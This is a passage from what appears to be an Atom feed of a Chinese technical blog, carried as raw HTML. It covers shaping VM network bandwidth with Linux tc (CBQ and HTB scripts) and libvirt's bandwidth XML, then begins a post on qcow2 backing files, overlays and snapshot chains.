theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:1 cbq rate 60mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:2 cbq rate 70mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:3 cbq rate 80mbit allot 1500 prio 5 bounded isolated</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3建立过滤器">3.建立过滤器<a class="hash-link" href="#3建立过滤器" title="标题的直接链接">​</a></h3><p>绑定指定带宽限制类型至指定虚拟机ip:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc filter add dev eth0 parent 1: protocol ip prio 16 u32 match ip src 192.168.1.102 flowid 1:2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="htb队列示例">htb队列示例<a class="hash-link" href="#htb队列示例" title="标题的直接链接">​</a></h2><p>我们可以在母机上给vm对应的虚拟网卡增加tc规则，使用htb队列，一个可用的脚本示例如下：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># add interface bandwidth limit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># usage: tc_add iface in_kbps out_kbps</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-name function" style="color:#d73a49">tc_add</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">iface</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_bw</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_bw</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_average</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">${in_bw}</span><span class="token string" style="color:#e3116c">kbps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_peak</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">${in_bw}</span><span class="token string" style="color:#e3116c">kbps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_average</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">${out_bw}</span><span class="token string" style="color:#e3116c">kbps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_peak</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">${out_bw}</span><span class="token string" style="color:#e3116c">kbps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">burst</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"2kb"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">mtu</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">r2q</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$((</span><span class="token variable" style="color:#36acaa">in_bw</span><span class="token variable operator" style="color:#393A34">*</span><span class="token variable number" style="color:#36acaa">1000</span><span class="token variable operator" style="color:#393A34">/</span><span class="token variable" style="color:#36acaa">mtu</span><span class="token variable operator" style="color:#393A34">-</span><span class="token variable number" style="color:#36acaa">1</span><span class="token variable" style="color:#36acaa">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">tc</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"/sbin/tc"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$r2q</span><span class="token plain"> -lt </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">r2q</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$in_bw</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> root handle </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: htb default </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> r2q </span><span class="token variable" style="color:#36acaa">$r2q</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> class </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: classid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:1 htb rate </span><span class="token variable" style="color:#36acaa">$in_average</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil </span><span class="token variable" style="color:#36acaa">$in_peak</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"> cburst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> class </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:1 classid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:2 htb rate </span><span class="token variable" style="color:#36acaa">$in_average</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil </span><span class="token variable" style="color:#36acaa">$in_peak</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"> cburst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:2 handle </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">: sfq perturb </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> filter </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:0 protocol </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> handle </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> fw flowid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$out_bw</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> ingress</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> filter </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent ffff: protocol </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> u32 match </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> src </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0/0 police rate </span><span class="token variable" style="color:#36acaa">$out_average</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">${out_bw}</span><span class="token plain">kb mtu 64kb drop </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flowid :1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># clean up interface bandwidth limit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># usage: tc_del iface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-name function" style="color:#d73a49">tc_del</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">iface</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">tc</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"/sbin/tc"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc del dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> root </span><span class="token operator" style="color:#393A34">&amp;&gt;&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sleep</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc del dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> ingress </span><span class="token operator" style="color:#393A34">&amp;&gt;&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt中的带宽控制">libvirt中的带宽控制<a class="hash-link" href="#libvirt中的带宽控制" title="标题的直接链接">​</a></h2><p>我比较推荐的方法还是直接使用libvirt，libvirt 中已经集成了带宽控制的功能，下面是关于带宽控制部分的xml描述:</p><p>使用方法：在网卡interface中加入</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">inbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">1000</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">5000</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">1024</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">outbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">128</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">'</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>以下是关于各项参数的解释，获取最新的信息可以参考<a href="http://www.libvirt.org/" target="_blank" rel="noopener noreferrer">libvirt文档</a>.</p><ul><li><p>mandatory attribute:</p><ul><li>average: It specifies average bit rate on interface being shaped.</li></ul></li><li><p>optional attributes:</p><ul><li>peak: which specifies maximum rate at which interface can send data,</li><li>burst: amount of bytes that can be burst at peak speed.</li></ul></li></ul><p>Accepted values: integer numbers.</p><p>units:</p><ul><li>average: kilobytes per second</li><li>peak: kilobytes per second</li><li>burst: kilobytes.</li></ul>]]></content>
        <category label="libvirt" term="libvirt"/>
        <category label="tc" term="tc"/>
        <category label="bandwidth" term="bandwidth"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[浅析qcow2镜像文件的快照合并]]></title>
        <id>/2012/11/23/libvirt-snapshot-blockcommit-blockpull</id>
        <link href="https://itxx00.github.io/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull"/>
        <updated>2012-11-23T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[show how to create snapshot with libvirt and qemu-img.]]></summary>
        <content type="html"><![CDATA[<blockquote><p>这是一篇关于snapshots, blockpull, blockcommit的的介绍.作者和with Eric Blake, Jeff Cody,Kevin Wolf以及很多IRC和mailing lists里面的同学大量讨论以及作者大量的特向测试的基础之上总结出来的</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础知识">基础知识<a class="hash-link" href="#基础知识" title="标题的直接链接">​</a></h2><p>一个虚拟机快照可被看作是虚拟机的在某个指定时间的视图（包括他的操作系统和所有的程序）.据此，某可以还原到一个之前的完整的状态，或者在guest运行的时候做个备份.所以，在我们继续深入之前我们必须搞懂两个名词：backing files和overlays .</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="qcow2-backing-files-与-overlays">QCOW2 backing files 与 overlays<a class="hash-link" href="#qcow2-backing-files-与-overlays" title="标题的直接链接">​</a></h3><p>qcow2（qemu copy-on-write）具有创建一个base-image，以及在base-image（即backing file）的基础上创建多个copy-on-write overlays镜像的能力.backing files和overlays十分有用，可以迅速的创建瘦装备虚拟机的实例，特别是在开发测试的时候可以让你迅速的回滚到之前的某个已知状态，丢弃overlay.</p><p>Figure-1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.--------------.    .-------------.    .-------------.    .-------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|              |    |             |    |             |    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase     |&lt;---| Overlay-1   |&lt;---| Overlay-1A  &lt;--- | Overlay-1B  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| (raw/qcow2)  |    | (qcow2)     |    | (qcow2)     |    | (qcow2)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'--------------'    '-------------'    '-------------'    '-------------'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表明rootbase是overlay-1的backing file，以此类推.</p><p>Figure-2</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.-----------.   .-----------.   .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase  |&lt;--- Overlay-1 |&lt;--- Overlay-1A &lt;--- Overlay-1B &lt;--- Overlay-1C |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |           |   |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'-----------'   '-----------'   '------------'  '------------'  '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ^    ^</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    |       |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |    '-------| Overlay-2 |&lt;---| Overlay-2A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            '-----------'    '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            .-----------.    .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   |            |           |    |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   '------------| Overlay-3 |&lt;---| Overlay-3A |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                |           |    | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                '-----------'    '------------'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表明我们可以只用单个backing file来创建多条链.</p><p>注意 : backing file 总是 只读 打开的. 换言之, 一旦新快照被创建，他的后端文件就不能被修改,(快照依赖于后端文件的这种状态).了解更多参见后面的('blockcommit' 节) .</p><p>示例 :</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[FedoraBase.img] ----- &lt;- [Fed-guest-1.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-1A]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  \--- &lt;- [Fed-guest-2.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-2A]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（注意箭头的方向，Fed-w-updates.qcow2 的backing file是 Fed-guest-1.qcow2）</p><p>上面的示例中可以看到 FedoraBase.img 安装了一个fedora17系统，并作为我们的backing file.现在这个backing file将作为模板快速的创建两个瘦装备实例，和 Figure-2 道理是一样的.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="具体操作">具体操作<a class="hash-link" href="#具体操作" title="标题的直接链接">​</a></h2><p>使用qemu-img为单个backing file来创建两个fedora的瘦装备克隆:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text 